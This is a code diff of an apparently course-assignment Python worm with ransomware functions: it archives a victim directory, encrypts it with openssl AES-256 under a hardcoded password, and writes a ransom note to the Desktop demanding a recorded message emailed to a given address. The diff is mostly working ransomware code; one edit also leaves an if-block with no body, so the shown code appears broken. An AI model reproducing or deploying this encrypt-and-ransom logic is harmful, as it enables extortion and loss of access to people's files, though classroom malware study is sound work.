@@ -339,13 +339,14 @@ def downloadProgramFromNet():
 def compressEncryptDelete(directory):
 
     tarName = ""
+    archiveName = ""
 
     if os.path.exists(directory):
         if not directory[-1] == "/":
-            directory += "/"
 
         # Set a tar name to ~/<name>.tar
-        tarName = os.path.expanduser("~") + "/" + directory.split("/")[-2] + ".tar"
+        archiveName = directory.split("/")[-2]
+        tarName = os.path.expanduser("~") + "/" + archiveName + ".tar"
     else:
         print "compressEncryptDelete function:"
         print "Path " + directory + " is not valid"
@@ -358,7 +359,7 @@ def compressEncryptDelete(directory):
             # Open a tarfile for writing and gz compress
             tar = tarfile.open(tarName, "w:gz")
             # Add the directory to the archive
-            tar.add(directory)
+            tar.add(directory, arcname = archiveName)
             # Close the tar file
             tar.close()
             print "Finished create tar file"
@@ -371,7 +372,7 @@ def compressEncryptDelete(directory):
             # Then we encrypt it.  We need to change open ssl to execute
             #call(["chmod", "a+x", OPENSSL])
             #print "Finished chmod openssl file"
-            
+
             # Run the encryption
             password = "cs456worm"
             ARGS = [OPENSSL, "aes-256-cbc", "-a", "-salt", "-in", tarName, "-out"]
@@ -414,13 +415,13 @@ def leaveRansomNote(tarName):
     ransomFile = os.path.expanduser("~") + "/Desktop/ransomNote.txt"
     try:
         fileObj = open(ransomFile, "w")
-        fileObj.write("Your files had been pwned with encryption !")
-        fileObj.write("To get it back, you will need to purchase the key from moi")
-        fileObj.write("You must complete the following within 5 days !")
-        fileObj.write("Record yourself saying 'I love CPSC 456' 100 times")
-        fileObj.write("Attach the recorded file and email to getmykey@cpsc456.info")
-        fileObj.write("Once verify you will get the key to decrypt the files")
-        fileObj.write("Adios !")
+        fileObj.write("Your files had been pwned with encryption !\n")
+        fileObj.write("To get it back, you will need to purchase the key from moi\n\n")
+        fileObj.write("You must complete the following within 5 days !\n")
+        fileObj.write("Record yourself saying 'I love CPSC 456' 100 times\n")
+        fileObj.write("Attach the recorded file and email to getmykey@cpsc456.info\n")
+        fileObj.write("Once verify you will get the key to decrypt the files\n")
+        fileObj.write("Adios !\n")
         fileObj.close()
         return True
     except IOError as msg:
